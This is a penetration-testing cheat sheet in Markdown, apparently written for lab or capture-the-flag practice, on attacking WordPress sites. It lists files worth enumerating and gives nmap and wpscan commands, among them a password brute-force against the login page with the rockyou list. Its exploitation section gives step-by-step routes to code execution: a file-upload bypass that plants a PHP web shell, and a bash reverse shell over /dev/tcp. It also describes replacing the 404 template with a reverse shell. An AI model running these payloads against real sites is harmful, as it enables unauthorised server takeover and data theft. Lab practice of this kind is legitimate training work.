# WordPress

## Enumeration

### Interesting Files

* wp-content
* wp-content/plugins
  * Check this directory even if `wpscan` doesn't identify any installed plugin
    * May not work though - check sources code of blog pages
* wp-admin
* wp-config.php
* wp-trackback.php
* wp-login.php

```
-rwxr-xr-x  1 www-data www-data   405 Feb  6  2020 index.php
-rwxr-xr-x  1 www-data www-data 19915 Jan  1  2021 license.txt
-rwxr-xr-x  1 www-data www-data  7346 Sep 30 00:41 readme.html
-rwxr-xr-x  1 www-data www-data  7165 Jan 21  2021 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Nov 10 14:18 wp-admin
-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data  2328 Feb 17  2021 wp-comments-post.php
-rwxr-xr-x  1 www-data www-data  3769 Nov  8 17:01 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Feb  9 22:51 wp-content
-rwxr-xr-x  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
drwxr-xr-x 25 www-data www-data 16384 Nov 10 14:18 wp-includes
-rwxr-xr-x  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
-rwxr-xr-x  1 www-data www-data  3900 May 15  2021 wp-load.php
-rwxr-xr-x  1 www-data www-data 45463 Apr  6  2021 wp-login.php
-rwxr-xr-x  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
-rwxr-xr-x  1 www-data www-data 22297 Jun  1  2021 wp-settings.php
-rwxr-xr-x  1 www-data www-data 31693 May  7  2021 wp-signup.php
-rwxr-xr-x  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
-rwxr-xr-x  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
```

### Scanning

#### nmap

```bash
nmap -sV --script=http-wordpress-brute.nse,http-wordpress-enum.nse,http-wordpress-users -p80 <IP>

```

#### wpscan

```bash
# Basic Scan
wpscan --url http://10.10.248.119 -o wpscan.log
# Enumerate vulnerable plugins, themes, and users
wpscan --url http://10.10.248.119 -e vp,vt,u -o wpscan.log --api-token <>
# Brute Forcing Login
wpscan --url http://10.10.128.156/ -U users.txt -P /usr/share/wordlists/rockyou.txt -vv
```

## Exploitation

### Plugins

* Can add modified WordPress plugin header to the top of the reverse shell file
* Upload reverse shell plugin as a zip file

#### Responsive Thumbnail Slider

* Using 'php/webapps/37998.txt' we can follow the steps from within the file.
* Responsive Thumbnail Slider --> Manage Images --> Add New
* Create a file called shell.php.jpg with the below contents:
  * `<?php system($_GET["cmd"]) ?>`
* With Burp Intercept on, upload the the file and send the request to Repeater
  * Modify the filename from shell.php.jpg to shell.php and send the modified request
* Turn off Intercept and back on the web page it should show "New image added successfully"
* There are two new entries of images (initial request and repeater request)
* Clicking on the webshell entry bring us to a new page and gives the link to the image
* Clicking the link brings us to the file and can now get command execution
  * By appending `?cmd=id`
* Now to get a reverse shell by updating the payload value
  * `?cmd=/bin/bash -c "bash -i>& /dev/tcp/<IP>/4444 0>&1"`
  * Note: It may have to be URL encoded

### Themes Templates

#### 404.php

* Edit the 404.php template to include a reverse shell payload
* Appearance --> Editor
* Select 404 Template from the right side pane
* Copy the contents of /usr/share/webshells/php/php-reverse-shell.php and replace the contents in the 404.php template
  * Update the attacker machine IP and port as necessary
  * Then click on the Update File button
* Start a netcat listener and visit a page that doesn't exist
  * `http://demo.ine.local/i-dont-exist`
    * And a reverse shell connection is made
